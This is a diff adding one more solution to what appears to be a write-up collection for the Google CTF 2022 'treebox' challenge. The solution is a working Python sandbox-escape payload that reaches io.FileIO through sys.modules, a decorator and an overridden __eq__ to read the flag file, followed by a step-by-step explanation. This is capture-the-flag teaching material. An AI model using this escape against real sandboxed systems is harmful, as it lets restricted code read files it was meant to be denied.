@@ -280,6 +280,41 @@ def print_read_fn():
     pass 
 ```
 
+22. @ajmal
+
+```py
+sys.stderr = sys.stdout
+
+FileIO = sys.modules['io'].FileIO
+
+class FlagIO(FileIO):
+    def __init__(self, fn):
+        pass
+
+FlagIO.__eq__ = FileIO.__init__
+
+@FlagIO
+def hello():
+    pass
+
+hello == "./flag"
+
+flag = [a for a in hello]
+
+assert False, flag
+```
+
+Read more at his [website](https://ajmalsiddiqui.me/ctf-writeups/google-ctf-2022-treebox/)
+The tricks are:
+
+1. Use sys.modules to import a module without an explicit import statement.
+2. Use a class subclassing io.FileIO in order to create something that can open the file and let us read it.
+3. Set it’s `__eq__` method to the `__init__` method of the original io.FileIO class, so that it can be invoked by just doing an equality test.
+4. Instantiate the class by using it as a decorator.
+5. Doing an equality test to implicitly run the `io.FileIO.__init__` function, which opens the flag file.
+6. Iterate over the open io.FileIO object to read the flag.
+7. Use the AssertionError raised by an assert statement as a print function to print the flag (after setting stderr to stdout because the challenge server doesn’t print stderr).
+
 ### Appendix
 
 Source code
